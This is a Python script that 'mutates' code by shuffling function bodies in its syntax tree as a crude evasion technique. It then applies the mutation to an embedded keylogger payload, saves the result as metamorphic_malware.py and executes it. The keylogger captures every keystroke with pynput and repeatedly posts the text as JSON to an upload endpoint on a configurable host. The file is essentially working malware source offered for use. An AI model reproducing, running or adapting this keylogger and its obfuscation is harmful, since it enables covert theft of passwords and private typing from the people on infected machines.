import random
import ast
import astunparse

def mutate_function(function_node):
    """Shuffle the body of a function while maintaining syntax validity."""
    if isinstance(function_node, ast.FunctionDef):
        body = function_node.body
        random.shuffle(body)
        function_node.body = body
    return function_node

def mutate_code(code):
    """Mutate the code by shuffling function bodies while preserving structure."""
    try:
        # Parse the code into an AST
        tree = ast.parse(code)

        for node in tree.body:
            if isinstance(node, ast.FunctionDef):
                mutate_function(node)

        # Convert the mutated AST back to source code
        return astunparse.unparse(tree)
    except Exception as e:
        print(f"Error mutating code: {e}")
        return code
#This code is an example of keylogger 
#https://github.com/amiroooamiran/Malware-with-python/
payload = """
from pynput import keyboard
import requests
import json
import threading
text = ""
ip_address = "127.0.0.1"
port_number = "5000"
time_interval = 10

def send_post_request():
    try:
        payload = json.dumps({"keyboardData": text})
        url = f"http://{ip_address}:{port_number}/upload"
        headers = {"Content-Type": "application/json"}
        requests.post(url, data=payload, headers=headers)
        
        # Set up a timer for the next request
        timer = threading.Timer(time_interval, send_post_request)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request: {e}")

def on_press(key):
    global text

    special_keys = {
        keyboard.Key.enter: "\\n",
        keyboard.Key.tab: "\\t",
        keyboard.Key.space: " ",
        keyboard.Key.shift: "",
        keyboard.Key.backspace: "" if len(text) == 0 else text[:-1],
        keyboard.Key.ctrl_l: "",
        keyboard.Key.ctrl_r: "",
        keyboard.Key.esc: False,
    }

    if key in special_keys:
        key_value = special_keys[key]
    else:
        key_value = str(key).strip("'")

    text += key_value


    send_post_request()

    return key != keyboard.Key.esc

with keyboard.Listener(on_press=on_press) as listener:

    send_post_request()
    listener.join()
"""

mutated_payload = mutate_code(payload)

# Save the mutated code as a new script
with open("metamorphic_malware.py", "w") as f:
    f.write(mutated_payload)

# Execute the mutated code
exec(mutated_payload)